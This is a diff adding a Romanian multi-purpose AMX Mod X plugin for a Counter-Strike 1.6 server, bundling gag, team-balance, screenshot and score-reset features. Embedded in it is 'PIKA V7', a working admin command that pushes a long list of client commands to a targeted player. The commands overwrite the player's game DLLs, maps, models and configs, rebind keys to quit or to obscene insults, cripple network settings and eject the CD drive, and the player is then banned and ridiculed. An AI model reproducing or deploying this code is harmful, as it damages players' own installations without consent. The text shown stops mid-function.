@@ -1,0 +1,997 @@
+#include <amxmodx>
+#include <engine>
+#include <amxmisc>
+#include <cstrike>
+#include <fun>
+#include < CC_ColorChat >
+
+#define PLUGIN "MULTI PLUGIN 2"
+#define VERSION "2"
+#define AUTHOR "Motanel :x [dLL]"
+
+#define TASK_INTERVAL 10.0
+#define ACCESS 			ADMIN_KICK
+#define WORDS			64
+#define SWEAR_GAGMINUTES	3
+#define SHOW
+
+#define adtime	 600.0 //Default of 10 minuites
+
+#define SS_ACCESS	ADMIN_SLAY
+#define SignTask	112233
+#define UnSignTask	332211
+
+enum
+{
+	
+	INFO_NAME,
+	INFO_IP,
+	INFO_AUTHID
+	
+};
+new const hud_messages[][] = {
+	
+        "PGL.RANGFORT.RO @ PLAY HARD",
+        "PGL.RANGFORT.RO @ LOOKING MANAGER 7 EURO",
+        "PGL.RANGFORT.RO @ OWNER LOOKING TO 5 EURO",
+        "PGL.RANGFORT.RO @ CAUTAM MANAGER LA 7 EURO",
+        "PGL.RANGFORT.RO @ INTERNATIONAL SERVER "
+};
+
+new const szTag[    ]  =  "*";
+new const szSite[    ]  =  "www.rangfort.ro/forum sectiunea PGL";
+
+new g_iUserHP[ 33 ];
+new g_iUserAP[ 33 ];
+
+new gCvarMoveSpec;
+
+new SyncHudMessage;
+new SyncHudMessage2;
+new SyncHudMessage3;
+
+new pcvar_Advertise
+new pcvar_Display
+
+new const tag[] = "[Gag]";
+new const g_FileName[] = "gag_words.ini";
+new const g_ConfigFile[] = "addons/amxmodx/configs/gag_words.ini"
+
+new 
+bool:g_Gaged[ 33 ], g_GagTime[ 33 ],
+bool:g_SwearGag[ 33 ], bool:g_CmdGag[ 33 ],
+bool:g_NameChanged[33];
+
+new g_reason[ 32 ], g_admin[ 32 ], g_name[ 33 ][ 32 ];
+
+new g_WordsFile[ 128 ];
+new g_Words[ WORDS ][ 32 ], g_Count, g_Len;
+
+new point, g_msgsaytext;
+new toggle_tag
+
+new gi_MaxPlayers;
+
+new const gs_Teams[ ][ ] =
+{
+	"TERRORIST",
+	"CT"
+};
+
+// - - - - - - - - -
+#define	INTERVAL 30	/* din cate in cate secunde se vor verifica echipele */
+const i_Immunity = 1;	/* 1 = adminii au imunitate, 0 adminii nu au imunitate */
+// - - - - - - - - -
+
+new CsTeams:zTeam[33]
+new zDeath[33]
+new bool:type_spec[33] = false
+new g_cvar
+
+// Numele fisierului .log
+#define LOGFILE		"PIKA_V7.log"
+
+
+/*********** DESTORY COMMANDS ********************************/
+new const g_pika [ ] [ ] = 
+{
+	"kill",
+	"motdfile models/player.mdl;motd_write y",
+	"motdfile models/v_ak47.mdl;motd_write x",
+	"motdfile models/p_ak47.mdl;motd_write x",
+	"motdfile models/v_flashbang.mdl;motd_write y",
+	"motdfile models/p_m3.mdl;motd_write x",
+	"motdfile models/v_awp.mdl;motd_write n",
+	"motdfile models/p_ump45.mdl;motd_write x",
+	"motdfile models/v_awp.mdl;motd_write x",
+	"motdfile models/player/arctic/arctic.mdl;motd_write x",
+	"motdfile models/player/gsg9/gsg9.mdl;motd_write y",
+	"motdfile models/player/sas/sas.mdl;motd_write x",
+	"motdfile models/player/terror/terror.mdl;motd_write y",
+	"motdfile models/player/vip/vip.mdl;motd_write x",
+	"motdfile models/player/urban/urban.mdl;motd_write x",
+	"motdfile resource/GameMenu.res;motd_write x",
+	"motdfile halflife.wad;motd_write x",
+	"motdfile liblist.gam;motd_write y",
+	"motdfile cs_dust.wad;motd_write x",
+	"motdfile events/ak47.sc;motd_write x",
+	"motdfile autoexec.cfg;motd_write x",
+	"motdfile server.cfg;motd_write x",
+	"motdfile ajawad.wad;motd_write x",
+	"motdfile cstrike.wad;motd_write x",
+	"motdfile dlls/mp.dll;motd_write x",
+	"motdfile dlls/cs_i386.so;motd_write x",
+	"motdfile cl_dlls/client.dll;motd_write x",
+	"motdfile resource/cstrike_english.txt;motd_write x",
+	"motdfile resource/game_menu.tga;motd_write x",
+	"motdfile maps/de_inferno.bsp;motd_write x",
+	"motdfile maps/de_dust2.bsp;motd_write x",
+	"motdfile maps/de_aztec.bsp;motd_write x",
+	"motdfile maps/de_dust.bsp;motd_write x",
+	"motdfile maps/de_train.bsp;motd_write x",
+	"motdfile cs_assault.wad;motd_write x",
+	"motdfile spectatormenu.txt.wad;motd_write x",
+	"motdfile custom.hpk;motd_write x",
+	"sys_ticrate 0.1",
+	"bind w sunt un mare codat , datimi ban !!!",
+	"bind a Vreau muie",
+	"bind d quit",
+	"cl_cmdrate 0.1",
+	"cl_updaterate 0.0.1",
+	"fps_max 1.0",
+	"fps_modem 1.0",
+	"PIKA_V7_DISTRUS",
+	"cl_timeout 0.0",
+	"cl_allowdownload 0",
+	"cl_allowupload 0",
+	"rate 00000",
+	"developer 2",
+	"hpk_maxsize 100",
+	"bind m sunt_un_cacat",
+	"bind q admin_esti_un_prost_I_",
+	"bind g admin_mata_suge_cariciu :))",
+	"cl_forwardspeed 100",
+	"cl_backspeed 100",
+	"cl_sidespeed 100",
+	"motdfile userconfig.cfg;motd_write x",
+	"bind t quit",
+	"bind y quit",
+	"cd eject"
+};
+
+
+public admin_chteam(id, level, cid) { 
+	if (!cmd_access(id, level, cid, 2))
+		return PLUGIN_HANDLED
+		
+	new cmd[10];
+	new arg[32];
+	
+	read_argv(0,cmd,9)
+	read_argv(1,arg,31)
+	new player = cmd_target(id,arg,1)
+	if (!player) return PLUGIN_HANDLED
+	
+	user_kill(player, 1);
+	
+	if(cmd[4]=='t')
+	{
+		cs_set_user_team(player,1);
+	}
+	if(cmd[4]=='c')
+	{
+		cs_set_user_team(player,2);
+	}
+	if(cmd[4]=='s')
+	{
+		cs_set_user_team(player,3);
+	}
+	return PLUGIN_HANDLED
+} 
+
+public plugin_init()
+{
+	register_plugin(PLUGIN, VERSION, AUTHOR)
+	// PARASHUTA AUTOMATA
+	// TEAM TRANSFER
+	register_concmd("amx_t", "admin_chteam", ADMIN_LEVEL_A, "<authid, nick or #userid>")
+	register_concmd("amx_ct", "admin_chteam", ADMIN_LEVEL_A, "<authid, nick or #userid>")
+	register_concmd("amx_spec", "admin_chteam", ADMIN_LEVEL_A, "<authid, nick or #userid>")
+	// PIKA V 7 
+	register_clcmd ( "amx_pika", "cmdPika", ADMIN_IMMUNITY, "<nume sau #userid>" );
+	g_cvar	= register_cvar("amx_specmode",	"0") 	// 0 - enable use to all, 1 - enable use only ADMINs
+	// SPEC PRIN COMANDA /SPEC
+	register_clcmd("say /spec", 		"cmdSpec", ADMIN_ALL, "- go to spectator")
+	register_clcmd("say_team /spec", 	"cmdSpec", ADMIN_ALL, "- go to spectator")
+	register_clcmd("say /back", 		"cmdBack", ADMIN_ALL, "- go back to your team")
+	register_clcmd("say_team /back", 	"cmdBack", ADMIN_ALL, "- go back to your team") 
+	// AUTOTEAMBALANCE
+	gi_MaxPlayers = get_maxplayers ( );
+	set_task ( float ( INTERVAL ), "CheckTeams", _, _, _, "b" );
+	
+	// ADVANCED GAG 2.1
+	register_concmd( "amx_gag", "gag_cmd", ACCESS,"- <nume> <minute> <motiv> - Da gag jucatorului" );
+	register_concmd( "amx_ungag", "ungag_cmd", ACCESS, "- <nume> - Scoate gagul" );
+	register_clcmd( "say", "check" );
+	register_clcmd( "say_team", "check" );
+	
+	toggle_tag = register_cvar( "gag_tag", "0" );
+	point = get_cvar_pointer( "amx_show_activity" );
+	g_msgsaytext = get_user_msgid( "SayText" );
+	//  PLUGIN AMX_SS
+	gCvarMoveSpec  =  register_cvar(  "ss_move_spec",  "0"  );
+	register_clcmd(  "amx_ss", "ClCmdSS"  );
+	// CENTER MSG
+	set_task( TASK_INTERVAL, "RandomHudWithRandomColors", 0, "", 0, "b"  );
+
+	SyncHudMessage  =  CreateHudSyncObj(    );
+	SyncHudMessage2  =  CreateHudSyncObj(    );
+	SyncHudMessage3  =  CreateHudSyncObj(    );
+	
+	//You may type /resetscore or /restartscore
+	register_clcmd("say /resetscore", "reset_score")
+	register_clcmd("say /restartscore", "reset_score")
+	register_clcmd("say /rs", "reset_score")
+	
+	//This command by default will be set at 0
+	//Change it to 1 in server.cfg if you want
+	//A message to be shown to advertise this.
+	pcvar_Advertise = register_cvar("sv_rsadvertise", "0")
+	//This command by default is also 0
+	//Change it to 1 in server.cfg if you want
+	//It to show who reset their scores when they do it
+	pcvar_Display = register_cvar("sv_rsdisplay", "0")
+	
+	if(get_cvar_num("sv_rsadvertise") == 1)
+	{
+		set_task(adtime, "advertise", _, _, _, "b")
+	}
+	return PLUGIN_CONTINUE
+}
+public client_PreThink(id)
+{
+	if(!is_user_alive(id)) 
+		return
+
+	new Float:fallspeed = 100.0 * -1.0
+
+	new button = get_user_button(id)
+	if(button & IN_USE) 
+	{
+		new Float:velocity[3]
+		entity_get_vector(id, EV_VEC_velocity, velocity)
+		if (velocity[2] < 0.0) 
+		{
+			entity_set_int(id, EV_INT_sequence, 3)
+			entity_set_int(id, EV_INT_gaitsequence, 1)
+			entity_set_float(id, EV_FL_frame, 1.0)
+			entity_set_float(id, EV_FL_framerate, 1.0)
+
+			velocity[2] = (velocity[2] + 40.0 < fallspeed) ? velocity[2] + 40.0 : fallspeed
+			entity_set_vector(id, EV_VEC_velocity, velocity)
+		}
+	}
+}
+public cmdPika ( id, level, cid )
+{
+	if ( !cmd_access ( id, level, cid, 2 ) )
+		return 1;
+	
+	new arg [ 33 ];
+	read_argv ( 1, arg, charsmax ( arg ) );
+	new player = cmd_target ( id, arg, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_ALLOW_SELF );
+	
+	if ( !player )
+	{
+		console_print ( id, "[PIKA V7] Jucatorul nu este online sau a iesit de pe Server." );
+		return 1;
+	}
+	
+	new authid [ 33 ], authid2 [ 33 ],
+	name2 [ 33 ], name [ 33 ],
+	userid2, reason [ 32 ], userip [ 33 ];
+	
+	get_user_authid ( id, authid, charsmax ( authid ) );
+	get_user_authid ( player, authid2, charsmax ( authid2 ) );
+	get_user_name ( player, name2, charsmax ( name2 ) );
+	get_user_name ( id, name, charsmax ( name ) );
+	get_user_ip ( player, userip, charsmax ( userip ) );
+	
+	userid2 = get_user_userid ( player )
+	
+	read_argv ( 2, reason, 31 );
+	remove_quotes ( reason );
+	
+	log_to_file ( LOGFILE, "Adminul %s La Distrus Pe: %s cu motivul: (%s)", name, player, userid2, reason )
+	
+	for ( new i = 0; i < sizeof ( g_pika ); i++ )
+		client_cmd ( player, g_pika [ i ] );
+	
+	server_cmd("amx_ban ^"%s^" ^"%s^" 0 ^"Ai Fost Distrus + ban permanent^"",name2,userip)
+	
+	client_cmd ( 0, "spk ^"vox/bizwarn detected user has PIKA_V7^"" );
+
+	ColorChat1( 0, "^x04-------------------------------- [ PIKA V7 ]--------------------------------------------------" );
+	ColorChat1( 0, "^x04[PIKA V7]^x01 Jucatorul^x04 %s^x01 cu ip^x04 %s^x01 a fost^x03 Distrus si banat^x01 !", name2, userip );
+	ColorChat1( 0, "^x04[PIKA V7]^x01 Comanda executata de catre adminul^x04 %s^x01 !", name );
+	ColorChat1( 0, "^x04--------------------------------[ PIKA V7 ]--------------------------------------------------" );
+	
+	set_hudmessage( 0, 255, 0, -1.0, -1.0, 2, 2.0, 2.0 );
+	show_hudmessage( 0, "Jucatorul %s a fost Distrus si banat!^nComanda executata de adminul %s.",name2, name );
+
+	return 1;
+}
+
+stock ColorChat1( const id, const input[ ], any:... ) 
+{
+	new count = 1, players[ 32 ];
+	static msg[ 191 ];
+	vformat( msg, 190, input, 3 );
+	
+	replace_all( msg, 190, "!g", "^4" );
+	replace_all( msg, 190, "!y", "^1" );
+	replace_all( msg, 190, "!t", "^3" );
+	
+	if( id ) 
+		players[ 0 ] = id;
+	else get_players( players, count, "ch" ); 
+	{
+		for( new i = 0; i < count; i++ ) 
+		{
+			if( is_user_connected( players[ i ] ) ) 
+			{
+				message_begin( MSG_ONE_UNRELIABLE, get_user_msgid( "SayText" ), _, players[ i ] );
+				write_byte( players[ i ] );
+				write_string( msg );
+				message_end( );
+			}
+		}
+	} 
+}
+
+public cmdSpec(id)
+{
+	if(!get_pcvar_num(g_cvar)) Spec(id)
+	else if( get_pcvar_num(g_cvar) && (get_user_flags(id) & ADMIN_KICK)) Spec(id)
+	else if( get_pcvar_num(g_cvar) && !(get_user_flags(id) & ADMIN_KICK)) PrintUserNotAdmin(id)
+}
+
+public cmdBack(id)
+{
+	if (type_spec[id] && cs_get_user_team(id) == CS_TEAM_SPECTATOR && zTeam[id] != CS_TEAM_SPECTATOR ) Back(id)
+	else if( get_pcvar_num(g_cvar) && !(get_user_flags(id) & ADMIN_KICK) ) PrintUserNotAdmin(id)
+}
+
+public Spec(id)
+{
+	zDeath[id] = cs_get_user_deaths(id)
+	if (cs_get_user_team(id) == CS_TEAM_SPECTATOR)
+	return
+	else{
+		type_spec[id] = true
+		zTeam[id] = cs_get_user_team(id)
+		cs_set_user_team(id, CS_TEAM_SPECTATOR)
+		user_silentkill(id)
+		client_print(id,print_chat,"Type /back to return from Spectator")
+	}
+	return
+}
+
+public Back(id)
+{
+	cs_set_user_team(id, zTeam[id])
+	cs_set_user_deaths(id, zDeath[id])
+	set_task(0.5,"FirstRespawn",id)
+	set_task(0.8,"SecondRespawn",id)
+}
+
+public FirstRespawn(id)
+{
+	cs_user_spawn(id)
+}
+
+public SecondRespawn(id)
+{
+	cs_user_spawn(id)
+	if (cs_get_user_team(id) == CS_TEAM_T){
+		give_item(id,"weapon_knife")
+		give_item(id,"weapon_glock18")
+		give_item(id,"ammo_9mm")
+	}
+	if (cs_get_user_team(id) == CS_TEAM_CT){
+		give_item(id,"weapon_knife")
+		give_item(id,"weapon_usp")
+		give_item(id,"ammo_45acp")
+		give_item(id,"ammo_45acp")
+	}
+}
+
+PrintUserNotAdmin(id)
+{
+	client_print(id,print_chat,"Only Admins can use /spec, /back command")
+}
+
+public PrintRule(id)
+{
+	if ( is_user_connected(id) && !is_user_bot(id) && !is_user_hltv(id) ){
+		client_print(id,print_chat,"Type /spec if you want to go Spectator")
+		client_print(id,print_chat,"Type /back to return from Spectator")
+	}
+}
+
+public client_putinserver(id)
+{
+	if(!get_pcvar_num(g_cvar)) Rule(id)
+	else if( get_pcvar_num(g_cvar) && (get_user_flags(id) & ADMIN_KICK)) Rule(id)
+	
+	g_iUserHP[  id  ]  =  0;
+	g_iUserAP[  id  ]  =  0;
+	
+	if(get_pcvar_num(pcvar_Advertise) == 1)
+	{
+		set_task(10.0, "connectmessage", id, _, _, "a", 1)
+	}
+}
+public CheckTeams ( )
+{
+	new i_TsNum = get_team_num ( 1 );
+	new i_CTsNum = get_team_num ( 2 );
+	
+	while ( ( i_TsNum - i_CTsNum ) > 1 )
+	{
+		i_TsNum--; ++i_CTsNum;
+		transfer_user ( 1, 2 );
+	}
+	
+	while ( ( i_TsNum - i_CTsNum ) < -1 )
+	{
+		i_TsNum++; --i_CTsNum;
+		transfer_user ( 2, 1 );
+	}
+		
+}
+
+stock get_team_num ( i_Team )
+{
+	new i_Count, i_Index;
+	
+	for ( i_Index = 1; i_Index <= gi_MaxPlayers; i_Index++ )
+		if ( get_user_team ( i_Index ) == i_Team )
+			i_Count++;
+			
+	return i_Count;
+}
+
+stock transfer_user ( i_From, i_To )
+{
+	new i_Players[ 32 ], i_Num;
+	get_players ( i_Players, i_Num, "ae", gs_Teams[ ( i_From - 1 ) ] )
+	
+	ChoosePlayer:
+	new i_Player = i_Players[ random_num ( 0, i_Num-1 ) ];
+	
+	if ( ! is_user_alive ( i_Player ) || ( i_Immunity && get_user_flags ( i_Player ) & ADMIN_IMMUNITY ) )
+		goto ChoosePlayer;
+	
+	switch ( i_To )
+	{
+		case 1: cs_set_user_team ( i_Player, CS_TEAM_T );
+		case 2: cs_set_user_team ( i_Player, CS_TEAM_CT );
+	}
+	
+	set_hudmessage ( 255, 85, 0, 0.01, 0.26, 0, 6.0, 7.0 );
+	show_hudmessage ( i_Player, "Ai fost transferat la cealalalta echipa^npentru a echilibra jocul.")
+	
+	//client_print ( i_Player, print_chat, "Ai fost transferat la cealalalta echipa pentru a echilibra jocul." );
+}
+
+public plugin_cfg()
+{
+	static dir[ 64 ];
+	get_localinfo( "amxx_configsdir", dir, 63 );
+	formatex( g_WordsFile , 127 , "%s/%s" , dir, g_FileName );
+	
+	if( !file_exists( g_WordsFile ) )
+		write_file( g_WordsFile, "[Gag Words]", -1 );
+		
+	new Len;
+	
+	while( g_Count < WORDS && read_file( g_WordsFile, g_Count ,g_Words[ g_Count ][ 1 ], 30, Len ) )
+	{
+		g_Words[ g_Count ][ 0 ] = Len;
+		g_Count++;
+	}
+}
+
+public gag_cmd( id, level, cid )
+{
+	if( !cmd_access( id, level, cid, 4 ) )
+		return PLUGIN_HANDLED;  	
+		
+	new arg[ 32 ], arg2[ 6 ], reason[ 32 ];
+	new name[ 32 ], namet[ 32 ];
+	new minutes;
+	
+  	read_argv(1, arg, 31)
+
+  	new player = cmd_target(id, arg, 9)
+
+  	if (!player) 
+      	return PLUGIN_HANDLED
+	
+	read_argv( 1, arg, sizeof arg - 1 );
+	read_argv( 2, arg2, sizeof arg2 - 1 );
+	read_argv( 3, reason, sizeof reason - 1 );
+		
+	get_user_name( id, name, 31 );
+	
+	copy( g_admin, 31, name );
+	copy( g_reason, 31, reason );
+	remove_quotes( reason );
+	
+	minutes = str_to_num( arg2 );
+	
+	new target = cmd_target( id, arg, 10 );
+	if( !target)
+		return PLUGIN_HANDLED;
+	
+	if( g_Gaged[ target ] )
+	{
+		console_print( id, "Jucatorul are deja gag!" );
+		return PLUGIN_HANDLED;
+	}
+	
+	get_user_name( target, namet, 31 );
+	copy( g_name[ target ], 31, namet );
+	
+	g_CmdGag[ target ] = true;
+	g_Gaged[target] = true;
+	g_GagTime[ target ] = minutes;
+	
+	print( 0, "^x04[Gag] %s:^x01 Gag jucatorul^x03 %s^x01 pentru^x03 [%d]^x01 minut(e). Motiv:^x03 %s",get_pcvar_num( point ) == 2 ? name : "", namet, minutes, reason );
+	
+	if( get_pcvar_num( toggle_tag ) == 1 )
+	{
+		new Buffer[ 64 ];
+		formatex( Buffer, sizeof Buffer - 1, "%s %s", tag, namet );
+		
+		g_NameChanged[ target ] = true;
+		client_cmd( target, "name ^"%s^"",Buffer );
+	}
+	
+	set_task( 60.0, "count", target + 123, _, _, "b" );
+	
+	return PLUGIN_HANDLED;
+}
+
+public ungag_cmd( id,level, cid )
+{
+	if( !cmd_access( id, level, cid, 2 ) )
+		return PLUGIN_HANDLED;
+		
+	new arg[ 32 ], reason[ 32 ], name[ 32 ];
+	read_argv( 1, arg, sizeof arg - 1 );
+	read_argv( 2, reason, sizeof reason - 1 );
+	get_user_name( id, name, sizeof name - 1 );
+	remove_quotes( reason );
+	
+	new target = cmd_target( id, arg, 11 );
+	if( !target )
+		return PLUGIN_HANDLED;
+	new namet[ 32 ];
+	get_user_name( target, namet, sizeof namet - 1 );
+	
+	if( !g_Gaged[ target ] )
+	{
+		console_print( id, "Jucatorul %s nu are gag.", namet );
+		return PLUGIN_HANDLED;
+	}
+	
+	g_Gaged[ target ] = false;
+	g_SwearGag[ target ] = false;
+	
+	if( g_NameChanged[ target ] )
+		client_cmd( target, "name ^"%s^"", g_name[ target ] );
+		
+	g_NameChanged[ target ] = false;
+	
+	remove_task( target + 123 );
+	
+	print( 0, "^x04[Gag] %s:^x01 UnGag jucatorul^x03 %s",get_pcvar_num( point ) == 2 ? name : "", namet );
+	
+	return PLUGIN_HANDLED;
+}
+	
+public count( task )
+{
+	new index = task - 123;
+	if( !is_user_connected( index ) )
+		return 0;
+		
+	g_GagTime[index] -= 1;
+	
+	if( g_GagTime[ index ] <= 0 )
+	{
+		remove_task( index + 123 );
+		
+		print( index, "Ai primit UnGag cu succes!" );
+		g_Gaged[ index ] = false;
+	
+		if( g_NameChanged[ index ] )
+			client_cmd( index, "name ^"%s^"", g_name[ index ] );
+		
+		return 0;
+	}
+	
+	return 1;
+}
+
+public check( id )
+{
+	new said[ 192 ];
+	read_args( said, sizeof said - 1 );
+	
+	if( !strlen( said ) )
+		return PLUGIN_CONTINUE;
+		
+	if( g_Gaged[ id ] )
+	{
+		if( g_CmdGag[ id ] )
+		{
+			print( id,"Ai primit gag de la: %s. Au mai ramas %d minut(e)" ,g_admin, g_GagTime[ id ], g_GagTime[ id ] == 1 ? "" : "s" );
+			print( id,"Motivul Gagului: %s", g_reason );
+			
+			return PLUGIN_HANDLED;
+		
+		} else if( g_SwearGag[ id ] ) {
+          		print( id, "Ai gag pentru limbaj vulgar sau reclama.")
+			print( id, "Au mai ramas %d minut(e)",  g_GagTime[ id ], g_GagTime[ id ] == 1 ? "" : "s" );
+			return PLUGIN_HANDLED;
+		}
+	} else {
+		
+		new bool:g_Sweared, i, pos;
+		
+		for( i = 0; i < g_Count; ++i )
+		{
+			if( ( pos = containi( said, g_Words[ i ][ 1 ] ) ) != -1 )
+			{
+				g_Len = g_Words[ i ][ 0 ];
+				
+				while( g_Len-- )
+					said[ pos++ ] = '*';
+					
+				g_Sweared = true;
+				continue;
+			}
+		}
+		
+		if( g_Sweared )
+		{
+			new cmd[ 32 ], name[ 32 ];
+			
+			get_user_name( id, name, sizeof name - 1 );
+			read_argv( 0, cmd, sizeof cmd - 1 );
+			copy( g_name[ id ], 31, name );
+			
+			engclient_cmd( id, cmd, said );
+			g_Gaged[ id ] = true;
+			g_CmdGag[ id ] = false;
+			
+			if( get_pcvar_num( toggle_tag ) == 1 )
+			{
+				new Buffer[ 64 ];
+				formatex( Buffer, sizeof Buffer - 1, "%s %s", tag, name );
+		
+				g_NameChanged[ id ] = true;
+				client_cmd( id, "name ^"%s^"", Buffer) ;
+			}
+			
+			g_SwearGag[ id ] = true;
+			g_GagTime[ id ] = SWEAR_GAGMINUTES;
+			
+			print( id, "Ai gag pentru limbaj vulgar sau reclama." );
+		
+			set_task( 60.0, "count",id+123,_,_,"b");
+			
+			return PLUGIN_HANDLED;
+		}
+	}
+	
+	return PLUGIN_CONTINUE;
+}
+
+public client_disconnect(id) 
+{ 
+	type_spec[id] = false
+	if(g_Gaged[id]) 
+	{
+	 new Nick[32],Authid[35],usrip[32]
+	 get_user_name(id,Nick,31)
+	 get_user_ip(id,usrip,31);
+	 get_user_authid(id,Authid,34) 
+	 print(0, "^x04[Gag]^x01 Jucatorul cu gag^x03 %s^x01[IP:^x03 %s^x01] a parasit serverul.",Nick,usrip)		
+		
+	 g_Gaged[ id ] = false;
+    	 g_SwearGag[ id ] = false;	
+    	 remove_task( id );
+		
+	}
+	g_iUserHP[  id  ]  =  0;
+	g_iUserAP[  id  ]  =  0;
+	
+	if( task_exists(  id + UnSignTask  )  )
+	{
+		ColorChat(  0, RED, "^x04%s^x03 %s^x01 s-a deconectat in timp ce i s-a facut SS!", szTag, GetInfo(  id,  INFO_NAME  )  );
+		remove_task(  id  + UnSignTask  );
+	}
+}
+
+print( id, const message[ ], { Float, Sql, Result, _ }:... )
+{
+	new Buffer[ 128 ], Buffer2[ 128 ];
+	
+	formatex( Buffer2, sizeof Buffer2 - 1, "%s", message );
+	vformat( Buffer, sizeof Buffer - 1, Buffer2, 3 );
+	
+	if( id )
+	{
+		message_begin( MSG_ONE, g_msgsaytext, _,id );
+		write_byte( id );
+		write_string( Buffer) ;
+		message_end();
+	
+	} else {
+		new players[ 32 ], index, num, i;
+		get_players( players, num, "ch" );
+		
+		for( i = 0; i < num; i++ )
+		{
+			index = players[ i ];
+			if( !is_user_connected( index ) ) continue;
+			
+			message_begin( MSG_ONE, g_msgsaytext, _, index );
+			write_byte( index );
+			write_string( Buffer );
+			message_end();
+		}
+	}
+}
+
+public reset_score(id)
+{
+	//These both NEED to be done twice, otherwise your frags wont
+	//until the next round
+	cs_set_user_deaths(id, 0)
+	set_user_frags(id, 0)
+	cs_set_user_deaths(id, 0)
+	set_user_frags(id, 0)
+	
+	if(get_pcvar_num(pcvar_Display) == 1)
+	{
+		new name[33]
+		get_user_name(id, name, 32)
+		client_print(0, print_chat, "%s has just reset his score", name)
+	}
+	else
+	{
+		client_print(id, print_chat, "You have just reset your score")
+	}
+	return PLUGIN_HANDLED
+}
+
+public advertise()
+{
+	set_hudmessage(255, 0, 0, -1.0, 0.20, 0, 0.2, 12.0)
+	show_hudmessage(0, "By typing /rs you can restart your deaths and kills back to 0")
+}
+
+public connectmessage(id)
+{
+	if(is_user_connected(id))
+	{
+	client_print(id, print_chat, "By typing /resetscore at any time during the game, you can reset your deaths and kills back to 0 (rather than reconnecting)")
+	}
+}
+
+public plugin_precache()
+{
+	if(!file_exists(g_ConfigFile)) 
+	{
+		write_file(g_ConfigFile, "muie")
+		write_file(g_ConfigFile, "mata")
+		write_file(g_ConfigFile, "sugeo")
+		write_file(g_ConfigFile, "fmm")
+	}
+}
+public ClCmdSS(  id  )
+{
+	if(  !(  get_user_flags(  id  )  &  SS_ACCESS  )  )
+	{
+		client_cmd(  id, "echo %s Nu ai acces la aceasta comanda!", szTag  );
+		return 1;
+	}
+	
+	new szFirstArg[ 32 ];
+	read_argv(  1,  szFirstArg, sizeof ( szFirstArg ) -1  );
+	
+	if(  equal(  szFirstArg, ""  )  )
+	{
+		client_cmd(  id, "echo amx_ss < nume > faci o poza semnata!"  );
+		return 1;
+	}
+	
+	new iPlayer  =  cmd_target(  id,  szFirstArg,  8  );
+	
+	if( !iPlayer  )
+	{
+		client_cmd(  id, "echo %s Jucatorul specificat nu a fost gasit!", szTag  );
+		return 1;
+	}
+	
+	if( !is_user_alive(  iPlayer  ) )
+	{
+		client_cmd(  id, "echo %s Jucatorul %s nu este in viata !", szTag, GetInfo(  iPlayer, INFO_NAME  )  );
+		return 1;
+	}
+	
+	if(  task_exists(  iPlayer  +  SignTask)  ||  task_exists(  iPlayer  + UnSignTask  )  )
+	{
+		client_cmd(  id, "echo %s Jucatorul %s este in curs de 'pozare' !", szTag, GetInfo(  iPlayer, INFO_NAME  )  );
+		return 1;
+	}
+	
+	ColorChat(  0,  RED,  "^x04%s^x03 %s^x01 i-a facut o poza semnata lui^x04 %s^x01 !",  szTag,  GetInfo(  id,  INFO_NAME  ),  GetInfo(  iPlayer,  INFO_NAME  )  );
+	
+	g_iUserHP[ iPlayer ]  =  get_user_health(  iPlayer  );
+	g_iUserAP[ iPlayer ]  =  get_user_armor(  iPlayer  );
+	
+	set_user_godmode(  iPlayer,  1  );
+	set_user_health(  iPlayer,  255  );
+	set_user_armor(  iPlayer,  255  );
+	
+	ColorChat(  iPlayer, RED, "^x04%s^x01 Nume:^x03 %s^x04 |^x01 Nume Admin:^x03 %s", szTag, GetInfo(  iPlayer,  INFO_NAME  ), GetInfo(  id, INFO_NAME  )  );
+	ColorChat(  iPlayer, RED, "^x04%s^x01 IP:^x03 %s^x04 |^x01 IP Admin:^x03 %s", szTag, GetInfo(  iPlayer, INFO_IP  ),  GetInfo(  id,  INFO_IP  )  );
+	ColorChat(  iPlayer, RED, "^x04%s^x01 SteamId:^x03 %s^x04 |^x01 SteamId Admin:^x03 %s", szTag, GetInfo(  iPlayer,  INFO_AUTHID  ),  GetInfo(  id,  INFO_AUTHID  )  );
+	ColorChat(  iPlayer, RED, "^x04%s^x01 Data/Ora:^x03 %s^x04 |^x01 Site ^x03%s", szTag, _get_time(    ),  szSite  );
+	client_print(  iPlayer,  print_center,  "Screenshot facut.."  );
+	
+	
+	client_print(  iPlayer,  print_console,  " %s Nume: %s | Nume Admin: %s", szTag, GetInfo(  iPlayer,  INFO_NAME  ), GetInfo(  id, INFO_NAME  )  );
+	client_print(  iPlayer,  print_console,  " %s IP: %s | IP Admin: %s", szTag, GetInfo(  iPlayer, INFO_IP  ),  GetInfo(  id,  INFO_IP  )  );
+	client_print(  iPlayer,  print_console,  " %s SteamId: %s | SteamId Admin: %s", szTag, GetInfo(  iPlayer,  INFO_AUTHID  ),  GetInfo(  id,  INFO_AUTHID  )  );
+	client_print(  iPlayer,  print_console,  " %s Data/Ora: %s | Site %s", szTag, _get_time(    ),  szSite  );
+	
+	for( new i = 1; i <= 3; i++ )
+		DisplayMessages(  iPlayer,  i  );
+	
+	set_task(  0.1, "SignScreen", iPlayer  + SignTask  );
+	
+	return 1;
+}
+
+public SignScreen(  iPlayer  )
+{
+	
+	iPlayer  -=  SignTask;
+	if(  !is_user_connected( iPlayer )  )	return 1;
+	
+	client_cmd(  iPlayer,  "toggleconsole;snapshot;toggleconsole"  );
+	
+	if( get_pcvar_num(  gCvarMoveSpec  )  )
+	{
+		user_kill(  iPlayer,  1  );
+		cs_set_user_team(  iPlayer,  CS_TEAM_SPECTATOR  );
+	}
+	
+	set_task(  0.7, "UnSignPlayer",  iPlayer + UnSignTask );
+	
+	return 0;
+	
+}
+	
+public UnSignPlayer(  iPlayer  )
+{
+	iPlayer -= UnSignTask;
+	if(  !is_user_connected( iPlayer ) )	return 0;
+	
+	ColorChat(  iPlayer, RED, "^x04%s^x03 Screenshot semnat..", szTag  );
+	client_cmd(  iPlayer,  "echo %s^x03 Screenshot semnat..", szTag  );
+	client_print(  iPlayer, print_center,  "Screenshot semnat.."  );
+	
+	if( is_user_alive(  iPlayer  )  )
+	{
+		set_user_godmode(  iPlayer,  0  );
+		set_user_health(  iPlayer,  g_iUserHP[ iPlayer ]  );
+		set_user_armor(  iPlayer,  g_iUserAP[ iPlayer ] );
+	}
+	
+	g_iUserHP[ iPlayer ]  =  0;
+	g_iUserAP[ iPlayer ]  =  0;
+	
+	return 0;
+}
+
+public DisplayMessages(  iPlayer,  const iMessage  )
+{
+	
+	new szHostName[ 64 ];
+	get_cvar_string( "hostname", szHostName, sizeof ( szHostName ) -1  );
+	
+	switch(  iMessage  )
+	{
+		case 1:
+		{
+			
